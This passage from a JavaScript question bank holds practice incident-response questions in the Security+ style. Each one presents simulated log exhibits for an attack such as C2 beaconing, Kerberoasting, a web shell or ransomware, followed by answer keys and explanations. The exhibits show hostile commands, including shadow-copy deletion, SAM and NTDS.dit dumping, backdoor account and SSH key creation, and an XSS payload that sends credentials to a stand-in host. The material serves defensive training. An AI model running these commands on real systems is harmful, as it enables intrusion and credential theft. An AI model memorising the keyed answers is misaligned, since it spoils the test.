    summary: "Password spraying breached one MFA-less VPN account. Disable that account and drop its session to contain, then enforce MFA and lockout policies and block the source."
  },
  {
    id: "PBQ-034",
    format: 2,
    domain: 4,
    title: "C2 Beaconing From a Workstation",
    brief: "The EDR flagged a finance workstation making suspiciously regular outbound connections to an uncategorized domain at a fixed cadence.",
    exhibitTitle: "siem://search index=netflow host=FIN-WS14",
    exhibit: "<span class='dim'>10:00:00 FIN-WS14 -> 23.94.x.x:443 bytes_out=842 bytes_in=120</span>\n<span class='hl'>10:00:60 FIN-WS14 -> 91.214.x.x:443 (cdn-update.cloudpatch[.]live) bytes_out=842 bytes_in=120</span>\n<span class='hl'>10:01:60 FIN-WS14 -> 91.214.x.x:443 (cdn-update.cloudpatch[.]live) bytes_out=842 bytes_in=120</span>\n<span class='hl'>10:02:60 FIN-WS14 -> 91.214.x.x:443 (cdn-update.cloudpatch[.]live) bytes_out=842 bytes_in=120</span>\n<span class='hl'>10:03:60 FIN-WS14 -> 91.214.x.x:443 (cdn-update.cloudpatch[.]live) bytes_out=842 bytes_in=120</span>\n<span class='warnc'>edr: parent=winword.exe child=powershell.exe -enc <span class='cy'>aQBlAHgA...</span> hidden_window</span>\n<span class='dim'>jitter ~2s, fixed 60s interval, low data volume, no user activity</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Note the fixed 60-second interval and tiny consistent payloads.",
        options: ["Data exfiltration", "Command-and-control (C2) beaconing", "DDoS participation", "Software update check"],
        answer: 1,
        explain: "Regular fixed-interval callbacks with small consistent payloads and jitter to an uncategorized domain are classic C2 beaconing, here spawned from a macro via encoded PowerShell."
      },
      {
        label: "Most likely initial access",
        hint: "Look at the process parent/child relationship.",
        options: ["A malicious Office macro launching PowerShell", "A vulnerable web server", "A rogue DHCP server", "Physical USB drop"],
        answer: 0,
        explain: "winword.exe spawning hidden encoded PowerShell indicates a macro-enabled document executed the loader that established the beacon."
      },
      {
        label: "Correct first containment action",
        hint: "Cut the host off but keep it for forensics.",
        options: ["Power off the workstation immediately", "Network-isolate the endpoint via EDR while preserving it", "Reimage the workstation now", "Block port 443 for the whole company"],
        answer: 1,
        explain: "EDR network isolation severs the C2 channel while keeping the host live for memory and disk forensics. Powering off destroys volatile evidence; reimaging skips eradication scoping."
      },
      {
        label: "Eradication follow-up",
        hint: "Stop the channel everywhere and remove the implant.",
        options: ["Whitelist cloudpatch.live in the proxy", "Block the C2 domain/IP enterprise-wide and remove the malware persistence", "Disable EDR alerts for that host", "Increase the beacon interval"],
        answer: 1,
        explain: "Eradication blocks the C2 indicators across all egress and removes the implant and its persistence (scheduled task/run key), then hunts for the same IOCs on other hosts."
      }
    ],
    summary: "Macro-delivered malware is beaconing to C2 at a fixed interval. Isolate the host via EDR to contain, then block C2 indicators network-wide and remove persistence."
  },
  {
    id: "PBQ-035",
    format: 2,
    domain: 4,
    title: "Lateral Movement With PsExec",
    brief: "After a single host alert, the SIEM showed an admin-style account hopping across several servers using remote service creation and SMB.",
    exhibitTitle: "siem://search index=windows EventCode IN (4624,4697,5145)",
    exhibit: "<span class='warnc'>11:02:14 WS-FIN14 EID4624 Logon Type 3 user=svc_backup src=10.8.0.55</span>\n<span class='hl'>11:02:18 SRV-APP02 EID5145 share=ADMIN$ file=PSEXESVC.exe access=write user=svc_backup</span>\n<span class='hl'>11:02:19 SRV-APP02 EID4697 service=PSEXESVC image=C:\\Windows\\PSEXESVC.exe user=svc_backup</span>\n<span class='hl'>11:05:41 SRV-DB01 EID5145 share=ADMIN$ file=PSEXESVC.exe access=write user=svc_backup</span>\n<span class='hl'>11:05:42 SRV-DB01 EID4697 service=PSEXESVC image=C:\\Windows\\PSEXESVC.exe user=svc_backup</span>\n<span class='cy'>11:06:10 SRV-DB01 cmd.exe -> reg save HKLM\\SAM sam.hive  (credential dumping)</span>\n<span class='dim'>svc_backup normally runs only on backup window 02:00-03:00</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Remote service install across multiple hosts using a service account.",
        options: ["DNS tunneling", "Lateral movement (PsExec/SMB)", "Phishing", "Ransomware detonation"],
        answer: 1,
        explain: "Writing PSEXESVC.exe to ADMIN$ and creating a remote service (EID 4697) on host after host is textbook PsExec-based lateral movement using a compromised service account."
      },
      {
        label: "Severity rating",
        hint: "The account reached a domain database server and dumped SAM.",
        options: ["Low", "Medium", "High", "Critical"],
        answer: 3,
        explain: "The attacker reached a database server and attempted credential dumping (reg save HKLM\\SAM), threatening domain-wide compromise. This is Critical."
      },
      {
        label: "Correct first containment action",
        hint: "Cut off the credential being used to hop, plus the source.",
        options: ["Disable the svc_backup account and isolate the affected servers", "Restart the domain controller", "Delete the netflow logs", "Email the server owners a warning"],
        answer: 0,
        explain: "Containment disables the abused svc_backup credential and network-isolates the touched hosts to stop further hopping while forensics proceeds."
      },
      {
        label: "Eradication follow-up",
        hint: "Assume harvested credentials and remove tooling.",
        options: ["Rotate exposed/service credentials, remove PSEXESVC, and restrict SMB admin shares", "Re-enable svc_backup with the same password", "Open ADMIN$ to all hosts for monitoring", "Lengthen the backup window"],
        answer: 0,
        explain: "Eradication rotates potentially dumped credentials, removes the dropped service binaries, and tiers/limits administrative SMB access (ADMIN$) to break the movement path."
      }
    ],
    summary: "A service account spread via PsExec and attempted SAM dumping. Disable the account and isolate hosts to contain, then rotate credentials and lock down admin shares."
  },
  {
    id: "PBQ-036",
    format: 2,
    domain: 4,
    title: "Large Outbound Data Exfiltration",
    brief: "The DLP and netflow systems alerted on an unusually large encrypted upload from a database administrator's host to an external file-sharing service after hours.",
    exhibitTitle: "siem://search index=netflow,dlp host=DBA-WS03",
    exhibit: "<span class='dim'>22:40:02 DBA-WS03 query: SELECT * FROM customers (1.2M rows) by user=mthomas</span>\n<span class='hl'>22:51:10 DBA-WS03 -> mega-files.example:443 upload session bytes_out=4,920,114,800</span>\n<span class='hl'>22:51:11 dlp: archive customers_full.7z matched rule PII_BULK (SSN,CCN patterns)</span>\n<span class='warnc'>22:51:12 proxy: destination category=file_sharing, first_seen_for_user=true</span>\n<span class='cy'>22:52:40 edr: 7z.exe a -pSecret123 customers_full.7z C:\\temp\\dump.csv</span>\n<span class='ok'>02:00:00 normal backup job DBA-WS03 -> backup-srv internal (expected)</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Bulk sensitive data leaving the network in one big encrypted blob.",
        options: ["Privilege escalation", "Data exfiltration", "Beaconing", "Phishing"],
        answer: 1,
        explain: "A multi-gigabyte encrypted archive of PII (matched by DLP) was uploaded to an external file-sharing site after hours. This is data exfiltration."
      },
      {
        label: "Why is the encryption notable here?",
        hint: "Consider how the attacker tried to evade inspection.",
        options: ["It proves the data is safe", "Password-protected archive evades content inspection during transfer", "It is required by compliance", "It speeds up the upload"],
        answer: 1,
        explain: "The 7z.exe -p (password) archive hides contents from DLP/proxy content inspection in transit, a common exfiltration evasion technique."
      },
      {
        label: "Correct first containment action",
        hint: "Stop the transfer and the host's egress now.",
        options: ["Wait for the upload to finish for evidence", "Block the destination and isolate DBA-WS03 to halt the transfer", "Reboot the proxy server", "Delete the customers table"],
        answer: 1,
        explain: "Containment immediately blocks the file-sharing destination and isolates the host to terminate the in-progress upload and prevent further exfiltration."
      },
      {
        label: "Eradication / response follow-up",
        hint: "Treat the account/host as compromised or insider-driven.",
        options: ["Restore everyone's DBA rights", "Disable the account, preserve evidence, and engage legal/HR for breach handling", "Increase the DLP threshold to reduce alerts", "Allow file_sharing category globally"],
        answer: 1,
        explain: "Whether insider or compromised credentials, eradication suspends the account, preserves forensic evidence, and triggers breach/legal/HR processes given confirmed PII loss."
      }
    ],
    summary: "Bulk PII was archived and uploaded externally after hours. Block the destination and isolate the host to contain, then disable the account and start breach/legal response."
  },
  {
    id: "PBQ-037",
    format: 2,
    domain: 4,
    title: "Local Privilege Escalation on Linux",
    brief: "An EDR alert fired when a low-privilege web service account suddenly spawned a root shell on a public-facing Linux server.",
    exhibitTitle: "/var/log/audit/audit.log",
    exhibit: "<span class='dim'>type=USER_CMD uid=33(www-data) cmd=\"ls /var/www\"</span>\n<span class='hl'>type=EXECVE uid=33(www-data) argv=\"/tmp/.x/exploit\" CVE-2021-4034(pkexec)</span>\n<span class='hl'>type=SYSCALL success=yes uid=33 -> euid=0(root) comm=\"pkexec\"</span>\n<span class='hl'>type=EXECVE uid=0(root) argv=\"/bin/bash -i\" spawned_by=www-data</span>\n<span class='warnc'>auth.log: useradd -o -u 0 -g 0 svc-helper (uid 0 backdoor account created)</span>\n<span class='cy'>auth.log: echo 'ssh-rsa AAAAB3...attacker' >> /root/.ssh/authorized_keys</span>\n<span class='dim'>www-data is the nginx worker, should never reach euid 0</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "A low-priv account became root by exploiting a setuid binary.",
        options: ["Privilege escalation", "Cross-site scripting", "Password spraying", "DNS tunneling"],
        answer: 0,
        explain: "The www-data account exploited a vulnerable setuid helper (pkexec / CVE-2021-4034) to gain euid 0, a local privilege escalation."
      },
      {
        label: "What persistence did the attacker establish?",
        hint: "Look at the new account and the SSH key.",
        options: ["Only a temporary shell", "A UID-0 backdoor account and an attacker SSH key in root's authorized_keys", "A cron job that prints the date", "A modified MOTD banner"],
        answer: 1,
        explain: "The attacker created a second uid-0 account (svc-helper) and added their public key to /root/.ssh/authorized_keys, giving persistent root access."
      },
      {
        label: "Correct first containment action",
        hint: "Root is owned and persistence exists; cut access fast.",
        options: ["Patch pkexec and continue serving traffic", "Network-isolate the server and block inbound SSH while preserving it", "Just delete the /tmp exploit file", "Restart nginx"],
        answer: 1,
        explain: "With confirmed root persistence, containment isolates the host (and blocks SSH) to deny the attacker, while preserving it for forensics. Patching alone leaves the backdoors."
      },
      {
        label: "Eradication follow-up",
        hint: "You cannot trust a rooted host; remove all footholds.",
        options: ["Remove the backdoor account and key, patch pkexec, then rebuild from known-good image", "Reset only the www-data password", "Add the attacker key to a watchlist and keep it", "Lower file permissions on /tmp only"],
        answer: 0,
        explain: "Because root was compromised, eradication removes the backdoor account/keys, patches the exploited binary, and rebuilds from a trusted image since full integrity cannot be assured."
      }
    ],
    summary: "A web account escalated to root via pkexec and planted a UID-0 backdoor and SSH key. Isolate to contain, then remove persistence, patch, and rebuild from known-good."
  },
  {
    id: "PBQ-038",
    format: 2,
    domain: 4,
    title: "Web Shell Uploaded via Upload Form",
    brief: "After a file-upload feature went live, the SIEM detected the web server process spawning command interpreters following a POST to a newly created .aspx file.",
    exhibitTitle: "/var/log/iis/u_ex260626.log",
    exhibit: "<span class='ok'>09:10:02 POST /upload.aspx 200 file=invoice.pdf user=cust221</span>\n<span class='hl'>09:14:51 POST /upload.aspx 200 file=logo.aspx;.jpg (double extension bypass)</span>\n<span class='hl'>09:15:10 GET /uploads/logo.aspx?cmd=whoami 200 ua=\"Mozilla/5.0\"</span>\n<span class='hl'>09:15:12 edr: w3wp.exe -> cmd.exe /c whoami (response: nt authority\\system)</span>\n<span class='hl'>09:16:40 GET /uploads/logo.aspx?cmd=net+user+hacker+P@ss+/add 200</span>\n<span class='warnc'>09:17:01 GET /uploads/logo.aspx?cmd=net+localgroup+administrators+hacker+/add 200</span>\n<span class='cy'>file hash logo.aspx matches known China Chopper web shell signature</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "An uploaded script now runs OS commands on the server.",
        options: ["Web shell upload / RCE", "SQL injection", "DNS tunneling", "Brute force"],
        answer: 0,
        explain: "A double-extension upload bypassed filtering, and the resulting .aspx file runs arbitrary commands via the cmd parameter. This is a web shell granting remote code execution."
      },
      {
        label: "Severity rating",
        hint: "Check the privilege level and the account it created.",
        options: ["Low", "Medium", "High", "Critical"],
        answer: 3,
        explain: "The shell runs as nt authority\\system and added an attacker to local administrators. Full server compromise with persistence is Critical."
      },
      {
        label: "Correct first containment action",
        hint: "Remove the live foothold and cut the host off.",
        options: ["Delete the web server logs", "Isolate the server and remove/quarantine the web shell file", "Restart the database", "Disable the SIEM rule"],
        answer: 1,
        explain: "Containment isolates the host and quarantines the malicious logo.aspx so the attacker can no longer run commands, while evidence is preserved."
      },
      {
        label: "Eradication follow-up",
        hint: "Close the upload flaw and remove what the attacker added.",
        options: ["Allow double extensions for compatibility", "Fix upload validation, remove the rogue admin account, and rebuild if integrity is uncertain", "Only change the upload folder name", "Reset the cust221 password"],
        answer: 1,
        explain: "Eradication enforces strict upload validation (content type, extension allowlist, non-executable upload dir), removes the rogue hacker account, and rebuilds since SYSTEM was compromised."
      }
    ],
    summary: "A web shell uploaded via double-extension bypass gave SYSTEM-level RCE and a rogue admin. Isolate and quarantine the shell to contain, then fix uploads and rebuild."
  },
  {
    id: "PBQ-039",
    format: 2,
    domain: 4,
    title: "DNS Tunneling Exfiltration",
    brief: "The DNS analytics platform flagged a host generating an abnormal volume of long, high-entropy subdomain lookups to a single external domain.",
    exhibitTitle: "siem://search index=dns host=HR-WS22",
    exhibit: "<span class='dim'>13:00:01 HR-WS22 query www.microsoft.com A -> 20.x.x.x</span>\n<span class='hl'>13:01:11 HR-WS22 query a9f3c2b1d8e7...64chars.data.exfil-zone[.]net TXT</span>\n<span class='hl'>13:01:12 HR-WS22 query 7b2e9d4c1a6f...64chars.data.exfil-zone[.]net TXT</span>\n<span class='hl'>13:01:13 HR-WS22 query c4d8a1f9b3e2...64chars.data.exfil-zone[.]net TXT</span>\n<span class='warnc'>stats: 9,840 TXT queries to *.exfil-zone[.]net in 6 min, avg label len 58, entropy high</span>\n<span class='cy'>exfil-zone[.]net authoritative NS hosted on 45.142.x.x (bulletproof range)</span>\n<span class='dim'>normal hosts issue <300 DNS queries/hour, mostly A/AAAA</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Data is being smuggled inside DNS query names.",
        options: ["DNS tunneling / exfiltration", "ARP poisoning", "SQL injection", "Smurf attack"],
        answer: 0,
        explain: "High-volume, long, high-entropy TXT lookups encoding data into subdomain labels toward one attacker-controlled domain is DNS tunneling used to exfiltrate data covertly."
      },
      {
        label: "Why does DNS tunneling often succeed?",
        hint: "Think about which port/protocol firewalls usually permit.",
        options: ["DNS is encrypted by default", "DNS (UDP/53) is almost always allowed outbound and rarely inspected", "It only works on internal networks", "Antivirus blocks all DNS"],
        answer: 1,
        explain: "Outbound DNS is broadly permitted and seldom deep-inspected, so tunneling abuses it to bypass egress controls that would block HTTP/HTTPS exfiltration."
      },
      {
        label: "Correct first containment action",
        hint: "Cut the covert channel for this host and domain.",
        options: ["Disable DNS for the whole company", "Sinkhole/block exfil-zone.net and isolate HR-WS22", "Increase DNS TTLs", "Switch all clients to a public resolver"],
        answer: 1,
        explain: "Containment sinkholes or blocks the tunneling domain and isolates the host, severing the channel while keeping the host for analysis."
      },
      {
        label: "Eradication / detection follow-up",
        hint: "Remove the implant and improve future detection.",
        options: ["Remove the tunneling malware and deploy DNS monitoring for entropy/volume anomalies", "Allow all TXT records to reduce alerts", "Disable DNS logging to save space", "Whitelist 45.142.0.0/16"],
        answer: 0,
        explain: "Eradication removes the malware driving the tunnel and adds DNS inspection (query length/entropy/volume, RDNS reputation) to catch future tunneling early."
      }
    ],
    summary: "A host exfiltrated data via high-entropy DNS TXT queries to a malicious domain. Sinkhole the domain and isolate the host, then remove the implant and add DNS analytics."
  },
  {
    id: "PBQ-040",
    format: 2,
    domain: 4,
    title: "RDP Brute Force and Hopping",
    brief: "An exposed jump host showed thousands of failed RDP logons followed by a success, after which the same account opened RDP sessions deeper into the network.",
    exhibitTitle: "siem://search index=windows EventCode IN (4625,4624,4778)",
    exhibit: "<span class='hl'>03:11:02 JUMP01 EID4625 user=administrator src=193.27.x.x Logon Type 10 (RDP) FAIL x3120</span>\n<span class='warnc'>03:48:55 JUMP01 EID4624 user=administrator src=193.27.x.x Logon Type 10 SUCCESS</span>\n<span class='hl'>03:49:40 JUMP01 -> SRV-FILE01 EID4778 RDP session reconnect user=administrator</span>\n<span class='hl'>03:52:10 SRV-FILE01 -> SRV-DC01 EID4624 Logon Type 10 user=administrator</span>\n<span class='cy'>03:55:00 SRV-DC01 ntdsutil 'ac i ntds' 'ifm' create full C:\\temp (NTDS.dit copy)</span>\n<span class='dim'>JUMP01 RDP exposed to internet on 3389; lockout policy disabled</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Thousands of failed logons then deeper RDP sessions.",
        options: ["RDP brute force then lateral movement", "XSS", "DNS tunneling", "Phishing"],
        answer: 0,
        explain: "3,120 failed RDP logons followed by a success and then RDP hops toward the domain controller show internet-facing RDP brute force enabling lateral movement."
      },
      {
        label: "Most serious observed action",
        hint: "What did the attacker do on the DC?",
        options: ["Read the MOTD", "Created an NTDS.dit (Active Directory database) copy", "Pinged the gateway", "Cleared the recycle bin"],
        answer: 1,
        explain: "ntdsutil IFM creation copies NTDS.dit, the Active Directory database containing all domain password hashes, a precursor to full domain compromise."
      },
      {
        label: "Correct first containment action",
        hint: "Stop the source and the abused credential immediately.",
        options: ["Block source IP, disable the administrator account, and isolate JUMP01/affected servers", "Reboot the file server only", "Email the help desk", "Lower the RDP color depth"],
        answer: 0,
        explain: "Containment blocks the attacking IP, disables the compromised administrator credential, and isolates the touched hosts to halt the spread toward the DC."
      },
      {
        label: "Eradication / recovery follow-up",
        hint: "Assume AD hashes are exposed.",
        options: ["Re-enable RDP to the internet for convenience", "Treat AD as compromised: reset domain/krbtgt credentials, remove RDP exposure, enforce MFA/NLA", "Just change one password", "Disable Event ID 4625 logging"],
        answer: 1,
        explain: "Because NTDS.dit was copied, recovery resets domain credentials (including krbtgt twice), removes internet RDP exposure, and enforces NLA/MFA and lockout policies."
      }
    ],
    summary: "Internet-facing RDP was brute-forced, then the attacker reached the DC and copied NTDS.dit. Block/disable and isolate to contain, then treat AD as compromised and reset."
  },
  {
    id: "PBQ-041",
    format: 2,
    domain: 4,
    title: "Phishing Leading to OAuth Token Theft",
    brief: "A user reported a suspicious consent prompt. The cloud audit log shows a third-party app was granted broad mailbox permissions and immediately began reading mail.",
    exhibitTitle: "siem://search index=cloud_audit source=m365",
    exhibit: "<span class='dim'>08:30:10 user=kpatel signed in from 10.2.3.4 (corp)</span>\n<span class='hl'>09:05:22 user=kpatel consent granted app='Mail Backup Pro' perms=Mail.ReadWrite,offline_access</span>\n<span class='hl'>09:05:24 app='Mail Backup Pro' client_ip=104.244.x.x (Tor exit) token=refresh issued</span>\n<span class='hl'>09:06:01 app reading mailbox kpatel: 2,140 messages enumerated</span>\n<span class='warnc'>09:07:33 inbox rule created: move messages from 'security@' to RSS Feeds, mark read</span>\n<span class='cy'>app registration created 09:01 by external tenant, not in app catalog</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "No password was stolen; a malicious app got a token instead.",
        options: ["Illicit OAuth consent (token) grant phishing", "SQL injection", "Password spraying", "DNS tunneling"],
        answer: 0,
        explain: "The user was tricked into consenting to a rogue OAuth app that received a refresh token with Mail.ReadWrite, bypassing the password and MFA. This is consent-grant phishing."
      },
      {
        label: "Why is revoking only the password insufficient?",
        hint: "Consider what the app holds.",
        options: ["The password still works", "The OAuth refresh token persists access independent of the password", "Tokens expire instantly", "MFA already blocked it"],
        answer: 1,
        explain: "A refresh token grants ongoing access without re-entering the password or MFA, so a password reset alone does not revoke the malicious app's access."
      },
      {
        label: "Correct first containment action",
        hint: "Kill what actually holds access.",
        options: ["Revoke the app's consent/tokens and remove the malicious inbox rule", "Reset the user's display name", "Block port 25", "Delete the user's mailbox"],
        answer: 0,
        explain: "Containment revokes the rogue app's grant and refresh tokens (and the user's sessions) and deletes the hiding inbox rule, cutting off active mailbox access."
      },
      {
        label: "Eradication / hardening follow-up",
        hint: "Stop future rogue consent.",
        options: ["Allow all third-party app consent", "Restrict user consent and require admin approval for app permissions", "Disable audit logging", "Whitelist Tor exit nodes"],
        answer: 1,
        explain: "Eradication disables risky user consent, requires admin approval/verified-publisher policies for OAuth apps, and reviews other tenants for the same rogue grant."
      }
    ],
    summary: "Consent-grant phishing gave a rogue OAuth app token-based mailbox access. Revoke the app's tokens and remove the inbox rule, then restrict consent and require admin approval."
  },
  {
    id: "PBQ-042",
    format: 2,
    domain: 4,
    title: "Ransomware Pre-Encryption Staging",
    brief: "The EDR flagged shadow-copy deletion and mass file renames on a file server, with backups being targeted before any ransom note appeared.",
    exhibitTitle: "siem://search index=edr host=SRV-FILE02",
    exhibit: "<span class='warnc'>14:02:10 SRV-FILE02 vssadmin delete shadows /all /quiet</span>\n<span class='hl'>14:02:12 SRV-FILE02 wbadmin delete catalog -quiet (backup catalog removed)</span>\n<span class='hl'>14:02:20 SRV-FILE02 bcdedit /set recoveryenabled No</span>\n<span class='hl'>14:03:05 SRV-FILE02 mass rename *.docx -> *.docx.lockbit (4,200 files/min)</span>\n<span class='hl'>14:03:40 SRV-FILE02 -> SRV-FILE03 SMB write of encrypt.exe to C$</span>\n<span class='cy'>14:04:00 dropped file: RESTORE-MY-FILES.txt with .onion address</span>\n<span class='dim'>process tree: explorer.exe -> mshta.exe -> encrypt.exe</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Backups deleted, files renamed with an extension, ransom note dropped.",
        options: ["Ransomware encryption event", "Data exfiltration only", "DNS tunneling", "Cryptomining"],
        answer: 0,
        explain: "Shadow-copy and backup catalog deletion, recovery disabling, mass file renaming to .lockbit, and a ransom note are the hallmarks of an active ransomware encryption event."
      },
      {
        label: "Severity rating",
        hint: "Encryption is active and spreading to another server.",
        options: ["Informational", "Low", "Medium", "Critical"],
        answer: 3,
        explain: "Active, spreading encryption that destroyed local recovery options threatens business continuity. This is Critical and time-sensitive."
      },
      {
        label: "Correct first containment action",
        hint: "Speed matters; stop spread without destroying volatile evidence where possible.",
        options: ["Negotiate with the attacker first", "Isolate affected hosts from the network immediately to stop encryption spread", "Wait until business hours", "Reinstall the OS right away"],
        answer: 1,
        explain: "Containment isolates the encrypting hosts at the network level immediately to halt lateral spread (the SMB push to SRV-FILE03) while preserving them for forensics."
      },
      {
        label: "Recovery follow-up",
        hint: "How do you get data back safely?",
        options: ["Pay the ransom and resume", "Rebuild from clean offline/immutable backups after eradication and verify integrity", "Decrypt by guessing the key", "Re-enable the affected host as-is"],
        answer: 1,
        explain: "Recovery restores from known-clean, offline/immutable backups after the malware and persistence are eradicated, then validates integrity before reconnecting."
      }
    ],
    summary: "Active ransomware deleted backups and is encrypting files across servers. Isolate affected hosts immediately to contain, then eradicate and restore from immutable backups."
  },
  {
    id: "PBQ-043",
    format: 2,
    domain: 4,
    title: "Kerberoasting Against Service Accounts",
    brief: "The SIEM detected a single workstation requesting service tickets for many SPNs in rapid succession using weak encryption, followed by offline cracking indicators.",
    exhibitTitle: "siem://search index=windows EventCode=4769",
    exhibit: "<span class='dim'>10:10:01 EID4769 TGS request user=jdoe service=HTTP/intranet enc=AES256 (normal)</span>\n<span class='hl'>10:12:40 EID4769 TGS user=jdoe service=MSSQL/sqlsrv01 enc=0x17(RC4)</span>\n<span class='hl'>10:12:41 EID4769 TGS user=jdoe service=CIFS/fs01 enc=0x17(RC4)</span>\n<span class='hl'>10:12:41 EID4769 TGS user=jdoe service=HTTP/app01 enc=0x17(RC4)</span>\n<span class='hl'>10:12:42 EID4769 TGS user=jdoe service=MSSQL/dwh01 enc=0x17(RC4) ... 38 SPNs in 9s</span>\n<span class='warnc'>10:30:00 host WS-DEV9 process hashcat.exe -m 13100 spns.txt rockyou.txt</span>\n<span class='cy'>jdoe is a standard user; bulk SPN enumeration is anomalous</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "Bulk RC4 service-ticket requests then offline cracking.",
        options: ["Kerberoasting", "Pass-the-hash", "SQL injection", "Password spraying"],
        answer: 0,
        explain: "Requesting many SPN service tickets with weak RC4 encryption and cracking them offline (hashcat -m 13100) to recover service-account passwords is Kerberoasting."
      },
      {
        label: "Why request RC4 (0x17) tickets?",
        hint: "Think about crackability of the ticket.",
        options: ["RC4 is more secure", "RC4-encrypted tickets are easier to crack offline than AES", "It is required by Kerberos", "It hides the request from the KDC"],
        answer: 1,
        explain: "RC4 service tickets are weaker and faster to brute-force offline, so attackers downgrade to RC4 to recover the service account's plaintext password."
      },
      {
        label: "Correct first containment action",
        hint: "Stop the enumerating user and assume targeted accounts at risk.",
        options: ["Disable jdoe, isolate WS-DEV9, and prioritize rotating targeted service-account passwords", "Reboot the KDC", "Disable Kerberos domain-wide", "Delete Event 4769 logs"],
        answer: 0,
        explain: "Containment disables the abusing account, isolates the cracking host, and begins rotating the requested service-account passwords before cracking succeeds."
      },
      {
        label: "Eradication / hardening follow-up",
        hint: "Make service-account tickets uncrackable.",
        options: ["Set short, simple service-account passwords", "Use long random passwords or gMSAs and disable RC4 for Kerberos", "Grant all SPNs to every user", "Turn off ticket logging"],
        answer: 1,
        explain: "Eradication moves to group Managed Service Accounts (gMSA) or long random passwords and enforces AES-only Kerberos, making Kerberoasted tickets infeasible to crack."
      }
    ],
    summary: "A user bulk-requested RC4 SPN tickets for offline cracking (Kerberoasting). Disable the account and rotate service passwords to contain, then adopt gMSAs and disable RC4."
  },
  {
    id: "PBQ-044",
    format: 2,
    domain: 4,
    title: "Reflected XSS Phishing Link",
    brief: "Several users clicked a link that landed on the company's own domain but rendered an attacker-controlled login overlay. The WAF logged the reflected parameter.",
    exhibitTitle: "/var/log/nginx/access.log",
    exhibit: "<span class='ok'>12:01:10 GET /welcome?name=Alex 200 ref=intranet</span>\n<span class='hl'>12:05:44 GET /welcome?name=&lt;script&gt;document.body.innerHTML=atob('PGZvcm0...')&lt;/script&gt; 200</span>\n<span class='hl'>12:05:44 referer: https://mail.attacker-lure.example/promo (external phishing email)</span>\n<span class='hl'>12:06:10 POST https://attacker-lure.example/collect creds for 6 users observed</span>\n<span class='warnc'>waf: parameter 'name' reflected unencoded into HTML response body</span>\n<span class='cy'>no persistence on server; payload lives only in the crafted URL</span>",
    fields: [
      {
        label: "Primary attack pattern",
        hint: "The script comes from the URL and is echoed back unstored.",
        options: ["Reflected cross-site scripting", "Stored XSS", "SQL injection", "Open redirect only"],
        answer: 0,
        explain: "The script arrives in the URL's name parameter and is reflected unencoded into the response for that one request, with no server-side storage. This is reflected XSS."
      },
      {
        label: "How does this differ from stored XSS?",
        hint: "Where does the payload live?",
        options: ["Reflected XSS is saved in the database", "Reflected XSS requires the victim to open a crafted link; nothing is stored server-side", "They are identical", "Reflected XSS only affects the server"],
        answer: 1,
        explain: "Reflected XSS delivers the payload per-request via a crafted URL the victim must click, whereas stored XSS persists in server data and hits anyone who views it."
      },
      {
        label: "Correct first containment action",
        hint: "Stop credential collection and warn users.",
        options: ["Block the attacker-lure.example collection domain and add WAF rule to reject the payload", "Take the entire site offline permanently", "Reset the database", "Ignore until the next sprint"],
        answer: 0,
        explain: "Containment blocks the credential-collection domain, deploys a WAF rule to reject the malicious reflected payload, and alerts affected users to reset passwords."
      },
      {
        label: "Eradication follow-up",
        hint: "Fix how the parameter is rendered.",
        options: ["Trust the name parameter as safe", "Encode the reflected parameter and add CSP to block inline script", "Increase the URL length limit", "Remove the WAF"],
        answer: 1,
        explain: "Eradication applies output encoding on the reflected value and a Content-Security-Policy that blocks inline script execution, removing the rendering flaw."
      }
    ],
    summary: "A reflected XSS link on the trusted domain overlaid a phishing form and harvested credentials. Block the collection domain and add a WAF rule, then encode output and add CSP."
  },
  {
    id: "PBQ-045",
    format: 2,
    domain: 4,
    title: "Insider Privilege Escalation via Group Change",
    brief: "An IAM alert showed a help-desk technician adding their own account to a privileged group outside change control, then accessing finance shares.",
    exhibitTitle: "siem://search index=windows EventCode IN (4728,4732,5140)",
    exhibit: "<span class='dim'>15:00:02 EID4624 user=tcruz (helpdesk tier1) logon from HD-WS07</span>\n<span class='hl'>15:14:33 EID4728 member=tcruz added to group 'Domain Admins' by tcruz</span>\n<span class='hl'>15:14:35 EID4732 member=tcruz added to local group Administrators on SRV-FIN05</span>\n<span class='warnc'>15:20:10 EID5140 share access \\\\SRV-FIN05\\Payroll$ by tcruz (not job-authorized)</span>\n<span class='cy'>15:22:40 copy \\\\SRV-FIN05\\Payroll$\\salaries.xlsx -> D:\\personal\\</span>\n<span class='dim'>no approved change ticket; tcruz role grants no admin rights</span>",
    fields: [
      {
        label: "Primary issue type",
        hint: "An authorized user granted themselves rights they should not have.",
        options: ["Insider privilege escalation / abuse", "External brute force", "Phishing", "DNS tunneling"],
        answer: 0,
        explain: "A help-desk user added their own account to Domain Admins and a local admin group with no change ticket, then accessed payroll. This is insider privilege escalation and abuse."
      },
      {
        label: "Severity rating",
        hint: "Domain Admin was self-granted and sensitive data was copied.",
        options: ["Informational", "Low", "Medium", "Critical"],
        answer: 3,
        explain: "Self-granting Domain Admin and exfiltrating payroll data is a severe trust and data-confidentiality breach, rated Critical."
      },
      {
        label: "Correct first containment action",
        hint: "Strip the privilege and stop the account fast.",
        options: ["Disable tcruz, remove the unauthorized group memberships, and preserve evidence", "Give tcruz a warning email", "Reboot the finance server", "Wait for the next access review"],
        answer: 0,
        explain: "Containment disables the account, reverses the unauthorized Domain Admins/local admin additions, and preserves logs and the copied file path for the investigation."
      },
      {
        label: "Eradication / control follow-up",
        hint: "Prevent self-elevation and require oversight.",
        options: ["Allow help-desk to self-manage admin groups", "Enforce least privilege, approval-gated group changes, and alerting on privileged group edits", "Disable EID 4728 logging", "Share the Domain Admins password broadly"],
        answer: 1,
        explain: "Eradication enforces least privilege and separation of duties so no one can add themselves to privileged groups, with approval workflows and real-time alerting on such changes."
      }
    ],
    summary: "A help-desk insider self-granted Domain Admin and copied payroll data. Disable the account and reverse the group changes to contain, then enforce approval-gated privilege controls."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-046",
    format: 2,
    domain: 4,
    title: "Kerberoasting Detected on Domain Controller",
